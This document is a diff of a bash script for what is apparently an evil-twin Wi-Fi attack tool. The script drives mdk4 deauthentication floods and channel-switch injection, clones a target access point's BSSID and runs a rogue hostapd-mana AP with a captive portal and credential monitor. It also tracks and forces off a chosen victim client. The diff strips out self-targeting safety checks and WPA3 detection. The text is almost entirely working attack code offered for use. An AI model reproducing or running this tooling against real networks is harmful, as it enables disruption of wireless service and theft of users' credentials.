@@ -64,235 +64,17 @@ track_pid() {
     SPAWNED_PIDS+=("$1")
 }
 
-# --- F5: GLOBAL MAC IDENTITY CHECK ---
-is_local_mac() {
-    local mac
-    mac=$(echo "$1" | tr -d '[:space:]' | tr 'A-Z' 'a-z')
-    [ -z "$mac" ] && return 1
-    echo "$PERMANENT_MACS" | grep -Fxiq "$mac"
-}
-
-# --- F7: MANA GHOST DERIVATIVE DETECTION ---
-# Detects BSSIDs that are LAA-bit variants of local MACs.
-# hostapd-mana with mana_loud=1 derives phantom BSSIDs by
-# flipping the locally-administered bit and varying 0-1 bytes.
-is_mana_ghost() {
-    local candidate
-    candidate=$(echo "$1" | tr -d '[:space:]' | tr 'A-Z' 'a-z')
-    [ -z "$candidate" ] && return 1
-
-    local c_bytes
-    IFS=':' read -ra c_bytes <<< "$candidate"
-    [ "${#c_bytes[@]}" -ne 6 ] && return 1
-
-    local c_b0=$((16#${c_bytes[0]}))
-
-    # LAA bit (bit 1 of byte 0) must be set on the candidate
-    if (( (c_b0 & 0x02) == 0 )); then
-        return 1
-    fi
-
-    while IFS= read -r local_mac; do
-        [ -z "$local_mac" ] && continue
-
-        local l_bytes
-        IFS=':' read -ra l_bytes <<< "$local_mac"
-        [ "${#l_bytes[@]}" -ne 6 ] && continue
-
-        # Compare bytes 1–5 (skip byte 0 — LAA bit makes it differ)
-        local diff_count=0
-        for i in 1 2 3 4 5; do
-            if [ "${c_bytes[$i]}" != "${l_bytes[$i]}" ]; then
-                (( diff_count++ ))
-            fi
-        done
-
-        # 0 or 1 differing bytes in positions 1–5 → MANA derivative
-        if [ "$diff_count" -le 1 ]; then
-            return 0
-        fi
-    done <<< "$PERMANENT_MACS"
-
-    return 1
-}
-
-# --- F0: HARD RESET ALL WIRELESS INTERFACES ---
-# Forces firmware-level beacon cessation before any scan runs.
-# Must execute before airodump-ng touches the airspace.
-_hard_reset_all_wireless() {
-    log STATUS "Hard-resetting all wireless interfaces..."
-
-    local all_ifaces
-    all_ifaces=$(iw dev 2>/dev/null | awk '/Interface/{print $2}')
-
-    for iface in $all_ifaces; do
-        local current_mode
-        current_mode=$(iw dev "$iface" info 2>/dev/null \
-            | awk '/type/{print $2}')
-
-        ip link set "$iface" down 2>/dev/null
-
-        # Restore factory MAC if it was cloned by a previous run
-        if command -v macchanger &>/dev/null; then
-            local before_mac after_mac
-            before_mac=$(cat "/sys/class/net/$iface/address" 2>/dev/null)
-            macchanger -p "$iface" >/dev/null 2>&1
-            after_mac=$(cat "/sys/class/net/$iface/address" 2>/dev/null)
-            if [ "$before_mac" != "$after_mac" ]; then
-                log WARN "$iface had cloned MAC $before_mac → restored $after_mac"
-            fi
-        fi
-
-        if [ "$current_mode" = "AP" ]; then
-            log WARN "$iface was in AP mode — forcing firmware STOP_AP"
-
-            # First pass: managed transition sends NL80211_CMD_DEL_BEACON
-            iw dev "$iface" set type managed 2>/dev/null
-            sleep 1
-
-            # Second pass: UP→DOWN cycle forces mt76 firmware to flush
-            # its internal beacon template buffer over USB
-            ip link set "$iface" up 2>/dev/null
-            sleep 0.3
-            ip link set "$iface" down 2>/dev/null
-            iw dev "$iface" set type managed 2>/dev/null
-            sleep 0.5
-        else
-            iw dev "$iface" set type managed 2>/dev/null
-            sleep 0.3
-        fi
-
-        # Verify
-        local new_mode
-        new_mode=$(iw dev "$iface" info 2>/dev/null \
-            | awk '/type/{print $2}')
-
-        if [ "$new_mode" != "managed" ]; then
-            log ERROR "$iface stuck in mode '$new_mode' after reset"
-            log ERROR "Unplug and replug the adapter, then re-run"
-            exit 1
-        fi
-    done
-
-    # Allow firmware beacon queues to fully drain
-    sleep 2
-    log INFO "All interfaces reset to managed mode"
-}
-
-# --- F0.5: POST-RESET GHOST BEACON VERIFICATION ---
-# Brief airspace scan to confirm no local adapter is still beaconing.
-# Called after monitor interfaces are live in setup_interfaces().
-_verify_no_ghost_beacons() {
-    log STATUS "Ghost beacon check (5s)..."
-
-    local found_ghost=0
-    local ghost_macs=""
-
-    ghost_macs=$(timeout 5 tcpdump -i "$MON_TARGET" -e -c 50 \
-        'type mgt subtype beacon' 2>/dev/null \
-        | awk '{print $10}' \
-        | sort -u)
-
-    if [ -n "$ghost_macs" ]; then
-        while IFS= read -r bssid; do
-            [ -z "$bssid" ] && continue
-            # tcpdump formats as xx:xx:xx:xx:xx:xx
-            [[ ! "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] \
-                && continue
-
-            if is_local_mac "$bssid" || is_mana_ghost "$bssid"; then
-                log ERROR "Ghost beacon detected: $bssid is a local adapter"
-                found_ghost=1
-            fi
-        done <<< "$ghost_macs"
-    fi
-
-    if [ "$found_ghost" -eq 1 ]; then
-        log ERROR "Hard reset insufficient — unplug and replug the adapter"
-        exit 1
-    fi
-
-    log INFO "Ghost check passed — airspace clean"
-}
-
-# --- F2: REFRESH MAC LIST AFTER MODE TRANSITIONS ---
-# mt76 can mutate MAC when entering monitor mode.
-# Captures both ip-link and sysfs sources.
-_refresh_permanent_macs() {
-    local current_macs
-    current_macs=$(ip link show \
-        | awk '/ether/ {print $2}' | tr 'A-Z' 'a-z')
-
-    for iface in "$MON_TARGET" "$MON_SUPPRESS" "$AP_IFACE"; do
-        local sysfs_mac
-        sysfs_mac=$(cat "/sys/class/net/$iface/address" 2>/dev/null \
-            | tr 'A-Z' 'a-z')
-        [ -n "$sysfs_mac" ] && \
-            current_macs="${current_macs}"$'\n'"${sysfs_mac}"
-    done
-
-    PERMANENT_MACS=$(echo "${PERMANENT_MACS}"$'\n'"${current_macs}" \
-        | sort -u | grep -v '^$')
-
-    log DEBUG "PERMANENT_MACS updated ($(echo "$PERMANENT_MACS" | wc -l) entries):"
-    log DEBUG "$PERMANENT_MACS"
-}
-
-# --- F6: PRE-CLONE SAFETY GATE ---
-# Absolute last-resort check before the script would spoof a local MAC.
-_validate_target_not_self() {
-    if is_local_mac "$T_BSSID"; then
-        log ERROR "ABORT: Target BSSID $T_BSSID matches a local adapter"
-        log ERROR "The scan selected your own hardware as a target"
-        exit 1
-    fi
-
-    if is_mana_ghost "$T_BSSID"; then
-        log ERROR "ABORT: Target BSSID $T_BSSID is a MANA ghost derivative"
-        log ERROR "This is a phantom from a previous run, not a real AP"
-        exit 1
-    fi
-
-    # Also validate all mesh targets
-    for entry in "${MESH_TARGETS[@]}"; do
-        local mesh_bssid="${entry#*:}"
-        if is_local_mac "$mesh_bssid" || is_mana_ghost "$mesh_bssid"; then
-            log ERROR "ABORT: Mesh target $mesh_bssid is local/ghost hardware"
-            exit 1
-        fi
-    done
-
-    log INFO "Target validation passed — no self-collision"
-}
-
 pre_cleanup() {
     if systemctl is-active --quiet tailscaled 2>/dev/null; then
-        echo -e "${YELLOW}[!] Tailscale is running. Its iptables rules will conflict with this tool.${NC}"
-        echo -e "${YELLOW}[!] Stop it before proceeding: systemctl stop tailscaled${NC}"
-        echo -e "${YELLOW}[!] If you use Tailscale for remote access, stop it from your remote session LAST.${NC}"
-        exit 1
+    echo -e "${YELLOW}[!] Tailscale is running. Its iptables rules will conflict with this tool.${NC}"
+    echo -e "${YELLOW}[!] Stop it before proceeding: systemctl stop tailscaled${NC}"
+    echo -e "${YELLOW}[!] If you use Tailscale for remote access, stop it from your remote session LAST.${NC}"
+    exit 1
     fi
-
-    echo -e "${BLUE}[*] Killing stale processes and sanitizing environment...${NC}"
-
-    # 1. Nuke daemons and attack processes
-    killall -9 hostapd-mana hostapd dnsmasq airodump-ng aireplay-ng mdk4 2>/dev/null
+    echo -e "${BLUE}[*] Killing stale processes from previous runs...${NC}"
+    killall -9 hostapd-mana hostapd dnsmasq 2>/dev/null
     pkill -9 -f lucifer_portal.py 2>/dev/null
     pkill -9 -f lucifer_csa.py 2>/dev/null
-
-    # 2. Hard-reset all wireless interfaces to kill ghost beacons
-    _hard_reset_all_wireless
-
-    # 3. Nuke temporary state files and configs
-    rm -f /tmp/hostapd.conf /tmp/dnsmasq.conf /tmp/hostapd.log /tmp/dnsmasq.log
-    rm -f /tmp/dnsmasq.leases /tmp/portal.log /tmp/creds.txt
-    rm -f /tmp/networks.temp /tmp/networks.sorted
-
-    # 4. Nuke stale scan data using the variable directly
-    if [ -n "$SCAN_FILE" ]; then
-        rm -f "${SCAN_FILE}"*.csv "${SCAN_FILE}"*.netxml "${SCAN_FILE}"*.cap 2>/dev/null
-    fi
-
     sleep 1
 }
 
@@ -331,27 +113,6 @@ _cleanup_save_artifacts() {
 }
 
 _cleanup_filesystem() {
-    # Restore factory MACs on AP interface before anything else
-    if [ -n "$AP_IFACE" ]; then
-        ip link set "$AP_IFACE" down 2>/dev/null
-
-        if command -v macchanger &>/dev/null; then
-            macchanger -p "$AP_IFACE" >/dev/null 2>&1
-        else
-            # Fallback: read permanent MAC from ethtool or sysfs
-            local factory_mac
-            factory_mac=$(ethtool -P "$AP_IFACE" 2>/dev/null \
-                | awk '{print $NF}')
-            if [ -n "$factory_mac" ] \
-                && [ "$factory_mac" != "00:00:00:00:00:00" ]; then
-                ip link set "$AP_IFACE" address "$factory_mac" 2>/dev/null
-            fi
-        fi
-
-        ip link set "$AP_IFACE" down 2>/dev/null
-        ip addr flush dev "$AP_IFACE" 2>/dev/null
-    fi
-
     rm -rf "$PORTAL_DIR" /tmp/hostapd.conf /tmp/dnsmasq.conf \
         /tmp/target.txt ${SCAN_FILE}* /tmp/networks.temp \
         /tmp/networks.sorted /tmp/hostapd.log /tmp/portal.log \
@@ -359,6 +120,11 @@ _cleanup_filesystem() {
 
     rm -f /tmp/target_ch*.txt /tmp/target_pincer_primary.txt \
         /tmp/target_suppress_ch*.txt /tmp/.pincer_target_ch 2>/dev/null
+
+    if [ -n "$AP_IFACE" ]; then
+        ip link set "$AP_IFACE" down 2>/dev/null
+        ip addr flush dev "$AP_IFACE" 2>/dev/null
+    fi
 }
 
 cleanup() {
@@ -405,8 +171,6 @@ check_root() {
         echo -e "${RED}[!] Run as root.${NC}"
         exit 1
     fi
-# Capture physical MACs before any spoofing occurs
-    PERMANENT_MACS=$(ip link show | awk '/ether/ {print $2}' | tr 'A-Z' 'a-z')
 }
 
 check_deps() {
@@ -679,12 +443,6 @@ setup_interfaces() {
     iw dev "$AP_IFACE" set type managed
     sleep 0.3
 
-    # F2: Recapture MACs after mode transitions (mt76 may have mutated them)
-    _refresh_permanent_macs
-
-    # F0.5: Verify no ghost beacons from local adapters
-    _verify_no_ghost_beacons
-
     echo -e "${GREEN}[+] Target: $MON_TARGET | Suppress: $MON_SUPPRESS | AP: $AP_IFACE${NC}"
 }
 
@@ -729,24 +487,6 @@ check_pmf() {
     fi
 
     local rsn_fields
-    local akm_type
-    akm_type=$(tshark -r "$cap_file" \
-        -Y "(wlan.fc.type_subtype == 0x08 || wlan.fc.type_subtype == 0x05) && wlan.sa == ${bssid}" \
-        -T fields \
-        -e wlan.rsn.akms.type \
-        2>/dev/null | head -1 | tr -d '[:space:]')
-
-    # AKM 8 = SAE (WPA3-Personal). Spec mandates PMF required.
-    # AKM 18 = SAE + FT. Same mandate.
-    # Short-circuit: no need to parse mfpr/mfpc.
-    if [[ "$akm_type" == *"8"* ]] || [[ "$akm_type" == *"18"* ]]; then
-        echo -e "${YELLOW}[!] WPA3-SAE detected (AKM $akm_type) — PMF REQUIRED by spec.${NC}"
-        echo -e "${YELLOW}    Deauth useless. Auth Flood + CSA primary vectors.${NC}"
-        PMF_ENABLED=2
-        rm -f "${cap_prefix}"-* 2>/dev/null
-        return
-    fi
-
     rsn_fields=$(tshark -r "$cap_file" \
         -Y "(wlan.fc.type_subtype == 0x08 || wlan.fc.type_subtype == 0x05) && wlan.sa == ${bssid}" \
         -T fields \
@@ -823,9 +563,6 @@ _parse_networks() {
 
         [[ ! "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] && continue
         [[ "$power" == "-1" || -z "$power" ]] && continue
-        if is_local_mac "$bssid" || is_mana_ghost "$bssid"; then
-            continue
-        fi
         [[ -z "$essid" ]] && essid="<hidden>"
 
         local band="2.4G"
@@ -863,14 +600,14 @@ scan_networks() {
     rm -f ${SCAN_FILE}*
 
     airodump-ng --band abg --write "$SCAN_FILE" \
-        --output-format csv "$MON_TARGET" </dev/null >/dev/null 2>&1 &
+        --output-format csv "$MON_TARGET" >/dev/null 2>&1 &
     SCAN_PID=$!
 
     local elapsed=0
     local max=300
     while [ $elapsed -lt $max ]; do
-        # read -n 1 -t 3 waits 3s for ANY key; returns 0 (break) if pressed, 1 if timeout
-        if read -r -n 1 -t 3 -s; then break; fi
+        # read -t 3 waits 3s for Enter; returns 0 (break) if pressed, 1 if timeout
+        if read -r -t 3 -s; then break; fi
         (( elapsed += 3 ))
         local csv_file
         csv_file=$(ls ${SCAN_FILE}*.csv 2>/dev/null | head -n 1)
@@ -904,52 +641,6 @@ scan_networks() {
     fi
 
     echo -e "${GREEN}[+] Target: $T_ESSID ($T_BSSID) on CH $T_CH${NC}"
-
-    if [ "$T_ESSID" = "<hidden>" ] || [ -z "$T_ESSID" ]; then
-        echo -e "${YELLOW}[!] Hidden SSID detected. Probing for real name...${NC}"
-
-        local resolved_ssid=""
-
-        set_monitor_channel "$MON_TARGET" "$T_CH"
-
-        # Stimulus: directed probes to force AP probe responses
-        # Run in background during the entire capture window
-        aireplay-ng -9 -a "$T_BSSID" "$MON_TARGET" >/dev/null 2>&1 &
-        local probe_pid=$!
-
-        # Capture any frame type that leaks SSID:
-        #   0x05 = probe response (AP -> client)
-        #   0x00 = association request (client -> AP)
-        #   0x02 = reassociation request (client -> AP)
-        #   0x04 = probe request (client -> broadcast, directed)
-        resolved_ssid=$(timeout 20 tshark -i "$MON_TARGET" \
-            -Y "((wlan.sa == ${T_BSSID} && (wlan.fc.type_subtype == 0x05)) || \
-                 (wlan.da == ${T_BSSID} && (wlan.fc.type_subtype == 0x00 || \
-                  wlan.fc.type_subtype == 0x02 || \
-                  wlan.fc.type_subtype == 0x04))) && \
-                 wlan.ssid != \"\"" \
-            -T fields -e wlan.ssid \
-            -c 1 \
-            2>/dev/null | head -1 | tr -d '[:space:]')
-
-        kill "$probe_pid" 2>/dev/null
-        wait "$probe_pid" 2>/dev/null
-
-        if [ -n "$resolved_ssid" ] && [ "$resolved_ssid" != "(null)" ]; then
-            T_ESSID="$resolved_ssid"
-            echo -e "${GREEN}[+] Resolved hidden SSID: $T_ESSID${NC}"
-        else
-            echo -e "${RED}[!] Could not resolve hidden SSID.${NC}"
-            echo -e "${RED}    CSA injection will be ineffective.${NC}"
-            read -p "Enter SSID manually (or press ENTER to continue): " manual_ssid
-            if [ -n "$manual_ssid" ]; then
-                T_ESSID="$manual_ssid"
-                echo -e "${GREEN}[+] Using manual SSID: $T_ESSID${NC}"
-            else
-                echo -e "${YELLOW}[!] Continuing with hidden SSID — CSA degraded.${NC}"
-            fi
-        fi
-    fi
 
     check_pmf "$T_BSSID" "$T_CH"
 }
@@ -991,17 +682,6 @@ collect_mesh_siblings() {
 
         [[ ! "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] && continue
         [[ "$power" == "-1" || -z "$power" ]] && continue
-
-        # F1/F5/F7: Exclude local adapters and MANA ghost derivatives
-        if is_local_mac "$bssid" || is_mana_ghost "$bssid"; then
-            log DEBUG "collect_mesh: filtered self/ghost BSSID $bssid"
-            continue
-        fi
-
-        # Skip the primary target — it's already in the list
-        if [ "${bssid,,}" = "${t_bssid_clean,,}" ]; then
-            continue
-        fi
 
         local is_target=0
         local reason=""
@@ -1196,14 +876,6 @@ hw_mode=$HW_MODE
 channel=$FAKE_CH
 ieee80211n=1
 wmm_enabled=1
-EOF
-
-    # Dynamically enable 802.11ac (VHT) for 5GHz to prevent roaming penalties
-    if [ "$T_CH" -gt 14 ]; then
-        echo "ieee80211ac=1" >> /tmp/hostapd.conf
-    fi
-
-    cat >> /tmp/hostapd.conf << EOF
 # --- FIX: Aggressive Zombie Cleanup ---
 disassoc_low_ack=1
 ap_max_inactivity=30
@@ -1290,13 +962,7 @@ setup_networking() {
     # hostapd-mana already owns the interface in AP mode.
     # We only layer on L3 config and firewall rules.
 
-    # Flush any stale IPs first to prevent "File exists" errors
-    ip addr flush dev "$AP_IFACE" 2>/dev/null
-
-    if ! ip addr add "${PORTAL_IP}/24" dev "$AP_IFACE"; then
-        echo -e "${RED}[!] FATAL: Failed to assign ${PORTAL_IP} to ${AP_IFACE}${NC}"
-        exit 1
-    fi
+    ip addr add "${PORTAL_IP}/24" dev "$AP_IFACE" 2>/dev/null
 
     iptables --flush
     iptables -t nat --flush
@@ -1381,7 +1047,7 @@ start_hostapd() {
     fi
 
     # Secondary check: verify interface is actually in AP mode
-    local mode actual_ch
+    local mode
     mode=$(iw dev "$AP_IFACE" info 2>/dev/null | grep type | awk '{print $2}')
     if [ "$mode" != "AP" ]; then
         echo -e "${RED}[!] hostapd started but interface not in AP mode (mode=$mode)${NC}"
@@ -1390,16 +1056,9 @@ start_hostapd() {
         exit 1
     fi
 
-    # Tertiary check: Did hostapd actually get the channel we asked for?
-    actual_ch=$(iw dev "$AP_IFACE" info 2>/dev/null | awk '/channel/{print $2}')
-    if [ -n "$actual_ch" ] && [ "$actual_ch" != "$FAKE_CH" ]; then
-        echo -e "${YELLOW}[!] Driver overrode requested channel! ${FAKE_CH} -> ${actual_ch}${NC}"
-        echo -e "${YELLOW}    Updating attack parameters to match reality.${NC}"
-        FAKE_CH="$actual_ch"
-    fi
-
-    echo -e "${GREEN}[+] hostapd-mana running (PID $HOSTAPD_PID) — interface in AP mode (CH $FAKE_CH)${NC}"
+    echo -e "${GREEN}[+] hostapd-mana running (PID $HOSTAPD_PID) — interface in AP mode${NC}"
 }
+
 start_dnsmasq() {
     echo -e "${BLUE}[*] Starting dnsmasq...${NC}"
     dnsmasq -C /tmp/dnsmasq.conf --log-queries --log-facility=/tmp/dnsmasq.log &
@@ -1469,9 +1128,7 @@ set_monitor_channel() {
     # 802.11-2020 §10.6.6.
     if ! iw dev "$iface" set freq "$freq" 2>/dev/null; then
         ip link set "$iface" down 2>/dev/null
-        if ! iw dev "$iface" set freq "$freq" 2>/dev/null; then
-            log WARN "set_monitor_channel: freq set failed for $iface → $freq MHz (CH $ch) even after bounce"
-        fi
+        iw dev "$iface" set freq "$freq" 2>/dev/null
         ip link set "$iface" up 2>/dev/null
     fi
 
@@ -1480,7 +1137,6 @@ set_monitor_channel() {
     actual_ch=$(iw dev "$iface" info 2>/dev/null \
         | awk '/channel/{print $2}')
     if [ "$actual_ch" != "$ch" ]; then
-        log WARN "set_monitor_channel: $iface stuck on CH ${actual_ch:-??} (wanted $ch)"
         return 1
     fi
     return 0
@@ -1514,8 +1170,17 @@ kill_verified() {
 
 sweep_orphans() {
     local iface="$1"
-    pkill -9 -f "mdk4 $iface" 2>/dev/null
-    pkill -9 -f "lucifer_csa.py.*--iface $iface" 2>/dev/null
+    # Belt-and-suspenders: catch anything kill_verified missed
+    # from a previous iteration or a prior crashed run
+    local stale
+    stale=$(pgrep -f "mdk4 $iface" 2>/dev/null)
+    if [ -n "$stale" ]; then
+        echo "$stale" | xargs kill -9 2>/dev/null
+    fi
+    stale=$(pgrep -f "lucifer_csa.py.*--iface $iface" 2>/dev/null)
+    if [ -n "$stale" ]; then
+        echo "$stale" | xargs kill -9 2>/dev/null
+    fi
     sleep 0.1
 }
 
@@ -1599,7 +1264,7 @@ target_loop() {
         local dwell=5
         attack_pids=()
 
-        if [ "$DEAUTH_ENABLED" -eq 1 ]; then
+        if [ "$PMF_ENABLED" -lt 2 ]; then
             mdk4 "$MON_TARGET" d -b "$target_file" \
                 >/dev/null 2>&1 &
             attack_pids+=($!)
@@ -1613,19 +1278,17 @@ target_loop() {
             done
         fi
 
-        if [ "$CSA_ENABLED" -eq 1 ]; then
-            for bssid in "${target_bssids[@]}"; do
-                python3 "$SCRIPT_DIR/lucifer_csa.py" \
-                    --iface "$MON_TARGET" \
-                    --bssid "$bssid" \
-                    --ssid "$T_ESSID" \
-                    --channel "$lock_ch" \
-                    --target-channel "$FAKE_CH" \
-                    --duration "$dwell" \
-                    >/dev/null 2>&1 &
-                attack_pids+=($!)
-            done
-        fi
+        for bssid in "${target_bssids[@]}"; do
+            python3 "$SCRIPT_DIR/lucifer_csa.py" \
+                --iface "$MON_TARGET" \
+                --bssid "$bssid" \
+                --ssid "$T_ESSID" \
+                --channel "$lock_ch" \
+                --target-channel "$FAKE_CH" \
+                --duration "$dwell" \
+                >/dev/null 2>&1 &
+            attack_pids+=($!)
+        done
 
         sleep "$dwell"
         kill_attack_wave "${attack_pids[@]}"
@@ -1651,21 +1314,7 @@ suppress_loop() {
         [ -f /tmp/.pincer_target_ch ] && \
             skip_ch=$(cat /tmp/.pincer_target_ch)
 
-        # Budget total rotation time, not per-channel dwell.
-        # Target: complete one full sweep in ≤10s so no channel
-        # goes uncontested long enough for client reassociation.
-        local suppressed_count=0
-        for ch in "${MESH_CHANNELS[@]}"; do
-            [ "$ch" = "$skip_ch" ] && continue
-            is_dfs_channel "$ch" && continue
-            (( suppressed_count++ ))
-        done
         local suppress_dwell=3
-        if [ "$suppressed_count" -gt 0 ]; then
-            suppress_dwell=$(( 10 / suppressed_count ))
-            [ "$suppress_dwell" -lt 2 ] && suppress_dwell=2
-            [ "$suppress_dwell" -gt 5 ] && suppress_dwell=5
-        fi
 
         for ch in "${MESH_CHANNELS[@]}"; do
             [ "$ch" = "$skip_ch" ] && continue
@@ -1687,7 +1336,7 @@ suppress_loop() {
 
             attack_pids=()
 
-            if [ "$DEAUTH_ENABLED" -eq 1 ]; then
+            if [ "$PMF_ENABLED" -lt 2 ]; then
                 mdk4 "$MON_SUPPRESS" d -b "$ch_file" \
                     >/dev/null 2>&1 &
                 attack_pids+=($!)
@@ -1701,30 +1350,22 @@ suppress_loop() {
                 done
             fi
 
-            if [ "$CSA_ENABLED" -eq 1 ]; then
-                for bssid in "${ch_bssids[@]}"; do
-                    python3 "$SCRIPT_DIR/lucifer_csa.py" \
-                        --iface "$MON_SUPPRESS" \
-                        --bssid "$bssid" \
-                        --ssid "$T_ESSID" \
-                        --channel "$ch" \
-                        --target-channel "$FAKE_CH" \
-                        --duration "$suppress_dwell" \
-                        >/dev/null 2>&1 &
-                    attack_pids+=($!)
-                done
-            fi
+            for bssid in "${ch_bssids[@]}"; do
+                python3 "$SCRIPT_DIR/lucifer_csa.py" \
+                    --iface "$MON_SUPPRESS" \
+                    --bssid "$bssid" \
+                    --ssid "$T_ESSID" \
+                    --channel "$ch" \
+                    --target-channel "$FAKE_CH" \
+                    --duration "$suppress_dwell" \
+                    >/dev/null 2>&1 &
+                attack_pids+=($!)
+            done
 
             sleep "$suppress_dwell"
             kill_attack_wave "${attack_pids[@]}"
         done
-        # Add a sleep here so it doesn't CPU-spin when idle!
-        sleep 1
     done
-}
-
-_get_local_macs() {
-    ip link show | awk '/link\/ether/ {print $2}' | tr 'A-Z' 'a-z'
 }
 
 # --- CLIENT DISCOVERY ---
@@ -1738,6 +1379,7 @@ discover_target_client() {
     fi
 
     echo -e "\n${BLUE}[*] Discovering clients on target network...${NC}"
+
     # Build lookup table of all target BSSIDs
     declare -A valid_bssids
     for entry in "${MESH_TARGETS[@]}"; do
@@ -1763,9 +1405,6 @@ discover_target_client() {
         [[ ! "$sta_mac" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] && continue
         [[ "$sta_power" == "-1" || -z "$sta_power" ]] && continue
 
-        if is_local_mac "$sta_mac" || is_mana_ghost "$sta_mac"; then
-            continue
-        fi
         if [ -n "${valid_bssids[${sta_bssid,,}]}" ]; then
             local already=0
             for existing in "${client_entries[@]}"; do
@@ -1837,19 +1476,26 @@ sense_client_channel() {
     local client_mac="$1"
     local last_known="$2"
 
-    local candidates=()
+    # Build scan order: last-known channel first to minimize hop time
+    local scan_order=()
     if [ -n "$last_known" ] && [ "$last_known" != "unknown" ]; then
-        candidates+=("$last_known")
+        scan_order+=("$last_known")
     fi
-    if [ "$T_CH" != "$last_known" ]; then
-        candidates+=("$T_CH")
-    fi
-
-    for ch in "${candidates[@]}"; do
+    for ch in "${MESH_CHANNELS[@]}"; do
+        [ "$ch" = "$last_known" ] && continue
         is_dfs_channel "$ch" && continue
+        scan_order+=("$ch")
+    done
+
+    for ch in "${scan_order[@]}"; do
         set_monitor_channel "$MON_TARGET" "$ch" || continue
 
-        if timeout 0.15 tcpdump -i "$MON_TARGET" -c 1 -q \
+        # BPF on monitor interface: "ether src" maps to 802.11 addr2
+        # (transmitter). Catches data, probes, auth, assoc from client.
+        # -c 1: exit on first match
+        # timeout 0.3: 300ms window — active clients transmit every
+        # ~100ms (null data keepalives in power save)
+        if timeout 0.3 tcpdump -i "$MON_TARGET" -c 1 -q \
             "ether src $client_mac" 2>/dev/null | grep -q .; then
             echo "$ch"
             return 0
@@ -1866,21 +1512,32 @@ check_client_captured() {
     local mac="$1"
     local mac_lower="${mac,,}"
 
-    # Check ARP table first — ultimate ground truth for L2/L3 presence.
-    # We explicitly exclude "FAILED" or "INCOMPLETE" states.
-    if ip neigh show dev "$AP_IFACE" 2>/dev/null | grep -qi "$mac_lower"; then
-        if ! ip neigh show dev "$AP_IFACE" 2>/dev/null | grep -i "$mac_lower" | grep -qi -E "(FAILED|INCOMPLETE)"; then
+    # hostapd-mana logs "AP-STA-CONNECTED" on association
+    if grep -qi "AP-STA-CONNECTED.*${mac_lower}" \
+        /tmp/hostapd.log 2>/dev/null; then
+
+        # Verify still connected: check it hasn't disconnected since
+        local last_connect last_disconnect
+        last_connect=$(grep -ci "AP-STA-CONNECTED.*${mac_lower}" \
+            /tmp/hostapd.log 2>/dev/null)
+        last_disconnect=$(grep -ci "AP-STA-DISCONNECTED.*${mac_lower}" \
+            /tmp/hostapd.log 2>/dev/null)
+
+        # More connects than disconnects = currently associated
+        if [ "${last_connect:-0}" -gt "${last_disconnect:-0}" ]; then
             return 0
         fi
     fi
 
-    # Fallback to hostapd logs for clients that just associated but haven't ARPed yet.
-    # Instead of counting totals, we just check the *very last* state event for this MAC.
-    local last_event
-    last_event=$(grep -i "AP-STA-.*${mac_lower}" /tmp/hostapd.log 2>/dev/null | tail -n 1)
-    if echo "$last_event" | grep -qi "AP-STA-CONNECTED"; then
-        # They connected, but we must verify they didn't go silent.
-        # If they aren't in the ARP table at all after 5 seconds, it's a ghost.
+    # dnsmasq lease file (active DHCP lease = client is on our network)
+    if [ -f /tmp/dnsmasq.leases ] && \
+        grep -qi "$mac_lower" /tmp/dnsmasq.leases 2>/dev/null; then
+        return 0
+    fi
+
+    # ARP table on AP interface (L3 reachability = definitely here)
+    if ip neigh show dev "$AP_IFACE" 2>/dev/null \
+        | grep -qi "$mac_lower"; then
         return 0
     fi
 
@@ -1903,12 +1560,11 @@ start_dissociation() {
         echo -e "${RED}    MESH MODE: ${total_bssids} BSSIDs across ${total_channels} channels${NC}"
     fi
 
-    local vectors=""
-    [ "$DEAUTH_ENABLED" -eq 1 ] && vectors+="Deauth + "
-    [ "$AUTH_FLOOD" -eq 1 ] && vectors+="Auth Flood + "
-    [ "$CSA_ENABLED" -eq 1 ] && vectors+="CSA"
-    vectors="${vectors% + }"
-    echo -e "${CYAN}    Vectors: ${vectors}${NC}"
+    case "$PMF_ENABLED" in
+        0) echo -e "${CYAN}    No PMF → Deauth + CSA + Auth Flood${NC}" ;;
+        1) echo -e "${YELLOW}    PMF CAPABLE → Deauth (legacy) + CSA + Auth Flood${NC}" ;;
+        2) echo -e "${YELLOW}    PMF REQUIRED → CSA + Auth Flood only${NC}" ;;
+    esac
 
     if [ -n "$TARGET_CLIENT" ]; then
         echo -e "${GREEN}    ADAPTIVE TRACKING: $TARGET_CLIENT${NC}"
@@ -1946,29 +1602,20 @@ start_dissociation() {
 }
 
 resolve_attack_strategy() {
-    DEAUTH_ENABLED=1
     AUTH_FLOOD=1
-    CSA_ENABLED=1
-
-    if [ "$PMF_ENABLED" -ge 2 ]; then
-        DEAUTH_ENABLED=0
-        AUTH_FLOOD=0
-        log STATUS "Deauth OFF (PMF required — frames dropped by AP)"
-        log STATUS "Auth flood OFF (PMF required — CSA needs clean air)"
-    else
-        log STATUS "Deauth ON (PMF < required)"
-    fi
 
     if [ "$SECURITY_MODE" == "WPA2" ]; then
         AUTH_FLOOD=0
-        log STATUS "Auth flood OFF (WPA2 clone — clean reassoc preferred)"
+        log STATUS "Auth flood OFF — WPA2 mode, PSK handles reassociation"
+    elif [ "$PMF_ENABLED" -eq 2 ]; then
+        AUTH_FLOOD=0
+        log STATUS "Auth flood OFF — PMF required, AP will rate-limit"
+    elif [ -n "$TARGET_CLIENT" ]; then
+        AUTH_FLOOD=0
+        log STATUS "Auth flood OFF — single client tracking, surgical mode"
+    else
+        log STATUS "Auth flood ON — aggressive broadcast disruption"
     fi
-
-    if [ "$AUTH_FLOOD" -eq 1 ]; then
-        log STATUS "Auth flood ON (association table exhaustion)"
-    fi
-
-    log STATUS "CSA injection ON"
 }
 
 # --- CREDENTIAL MONITOR ---
@@ -2004,9 +1651,6 @@ main() {
     resolve_attack_strategy
     # Phase 4: Execution — ORDER MATTERS
     #
-    # Step 0: Final safety gate — abort if target is own hardware
-    _validate_target_not_self
-
     # Step 1: Clone MAC while interface is raw/managed and DOWN
     clone_target_bssid
 
@@ -2040,8 +1684,6 @@ main() {
     echo -e " BSSID Cloned: ${CYAN}$([ "$CLONED_BSSID" -eq 1 ] && echo "YES" || echo "NO")${NC}"
